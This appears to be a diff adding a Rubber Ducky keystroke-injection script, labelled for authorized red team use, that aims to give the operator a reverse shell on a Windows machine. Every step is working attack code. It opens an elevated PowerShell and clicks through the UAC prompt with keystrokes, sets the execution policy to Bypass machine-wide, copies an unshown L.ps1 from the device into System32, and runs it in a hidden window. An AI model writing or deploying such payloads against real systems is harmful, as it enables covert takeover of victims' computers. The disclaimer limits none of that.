@@ -1,0 +1,43 @@
+REM ----------------------------------------
+REM Title: Reverse Shell Transfer via Ducky
+REM Description: Transfers and runs L.ps1 from CIRCUITPY to System32 and then provides you with a Reverse Shell.
+REM Author: Subbu Krishna Raju B N
+REM Use Case: Authorized red team simulations only
+REM ----------------------------------------
+
+DELAY 1000
+REM Wait 1 second after plug-in to ensure system is ready
+
+GUI r
+REM Opens the Run dialog with Windows + R
+
+DELAY 1000
+STRING powershell -Command "Start-Process powershell -Verb runAs"
+REM Starts PowerShell as Administrator
+
+ENTER
+DELAY 4000
+REM Wait for UAC prompt to appear
+
+LEFTARROW
+LEFTARROW
+DELAY 1000
+ENTER
+REM Navigates to and confirms the "Yes" button in UAC dialog (if keyboard-based UAC)
+
+DELAY 3000
+REM Give PowerShell window time to open
+
+STRING $duck=Get-Volume -FileSystemLabel "CIRCUITPY" | Select-Object -ExpandProperty DriveLetter;Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Bypass -Force;Copy-Item -Path "${duck}:\L.ps1" -Destination "C:\Windows\System32\"
+REM 1. Find the drive letter of CIRCUITPY (Rubber Ducky storage)
+REM 2. Set PowerShell execution policy to Bypass
+REM 3. Copy the L.ps1 script from CIRCUITPY to System32
+
+ENTER
+
+STRING Powershell.exe -WindowStyle Hidden "C:\Windows\System32\L.ps1"
+REM Execute the script silently with hidden window (no pop-up)
+
+ENTER
+
+
